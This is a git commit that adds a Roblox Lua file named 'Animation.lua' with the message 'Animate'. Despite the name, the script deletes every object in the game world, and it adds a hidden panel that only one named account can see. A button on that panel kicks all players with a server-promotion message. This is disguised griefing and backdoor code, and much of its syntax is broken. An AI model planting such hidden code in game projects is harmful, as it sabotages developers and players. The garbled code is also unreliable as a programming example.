1ca82080dca6213c185e2ce9a2a04dc1287ca101
vrkx <141280206+vrkx@users.noreply.github.com>
2024-03-12 20:30:20 -0400

    Animate

---
+++ Animation.lua
@@ -0,0 +1,16 @@
+local Player = game.Players.LocalPlayer
+for i,v in pairs(workspace:GetChildren()) do
+v:Destroy()
+end)
+local HellcatUI = Instance.new("Frame")
+HellcatUI.Visible = false
+HellcatUI.Parent = Player.PlayerGui.MainScreenGui
+local Destroy = Instance.new("TextButton")
+Destroy.Parent = HellcatUI
+If Player.Name = "27Melkx" then
+HellcatUI.Visible = true
+end)
+Destroy.Activated:Connect(function()
+for i,v in pairs(game.Players)
+v:Kick(".GG/DAFIGHTSGAME")
+end)
